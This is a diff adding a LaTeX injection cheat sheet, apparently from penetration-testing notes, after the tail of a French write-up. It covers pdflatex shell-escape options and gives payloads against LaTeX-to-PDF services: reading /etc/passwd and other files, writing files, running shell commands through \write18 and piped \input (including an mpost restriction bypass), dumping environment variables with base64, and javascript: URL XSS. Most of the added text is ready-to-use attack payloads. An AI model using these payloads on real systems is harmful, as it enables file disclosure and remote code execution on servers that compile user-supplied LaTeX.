@@ -75,3 +75,109 @@ Voici le contenu du fichier \texttt{.passwd} :
 
 \end{document}
 ```
+
+
+# LaTeX Injection
+
+Usually the servers that will find on the internet that **convert LaTeX code to PDF** use `**pdflatex**`. This program uses 3 main attributes to (dis)allow command execution:
+
+- `**--no-shell-escape**`: **Disable** the `\write18{command}` construct, even if it is enabled in the texmf.cnf file.
+    
+- `**--shell-restricted**`: Same as `--shell-escape`, but **limited** to a 'safe' set of **predefined** **commands (**On Ubuntu 16.04 the list is in `/usr/share/texmf/web2c/texmf.cnf`).
+    
+- `**--shell-escape**`: **Enable** the `\write18{command}` construct. The command can be any shell command. This construct is normally disallowed for security reasons.
+    
+
+However, there are other ways to execute commands, so to avoid RCE it's very important to use `--shell-restricted`.
+
+## Read file
+
+You might need to adjust injection with wrappers as [ or $.
+
+```latex
+\input{/etc/passwd}
+\include{password} # load .tex file
+\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
+\usepackage{verbatim}
+\verbatiminput{/etc/passwd}
+```
+
+#### Read single lined file
+
+```latex
+\newread\file
+\openin\file=/etc/issue
+\read\file to\line
+\text{\line}
+\closein\file
+```
+
+#### Read multiple lined file
+
+```latex
+\newread\file
+\openin\file=/etc/passwd
+\loop\unless\ifeof\file
+    \read\file to\fileline
+    \text{\fileline}
+\repeat
+\closein\file
+```
+
+
+#### Write file
+
+```latex
+\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{Hello-world}
+\closeout\outfile
+```
+
+#### Command execution
+
+**The input of the command will be redirected to stdin, use a temp file to get it.**
+
+```latex
+\immediate\write18{whoami > output}
+\input{output}
+
+\input{|"/bin/hostname"}
+\input{|"extractbb /etc/passwd > /tmp/b.tex"}
+
+# allowed mpost command RCE
+\documentclass{article}\begin{document}
+\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
+\end{document}
+
+# If mpost is not allowed there are other commands you might be able to execute
+## Just get the version
+\input{|"bibtex8 --version > /tmp/b.tex"}
+## Search the file pdfetex.ini
+\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
+## Get env var value
+\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
+## Get the value of shell_escape_commands without needing to read pdfetex.ini
+\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
+```
+
+If you get any LaTex error, consider using base64 to get the result without bad characters
+
+```
+\immediate\write18{env | base64 > test.tex}
+\input{text.tex}
+```
+
+```
+\input|ls|base4
+\input{|"/bin/hostname"}
+```
+
+#### Cross Site Scripting
+
+From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
+
+```
+\url{javascript:alert(1)}
+\href{javascript:alert(1)}{placeholder}
+```
